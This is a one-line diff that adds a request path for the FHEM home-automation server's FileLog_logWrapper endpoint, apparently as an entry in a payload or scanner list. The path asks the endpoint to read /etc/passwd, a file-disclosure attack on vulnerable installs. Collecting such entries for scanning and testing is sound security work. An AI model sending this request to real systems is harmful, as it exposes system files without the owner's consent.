@@ -1,0 +1,1 @@
+/fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text
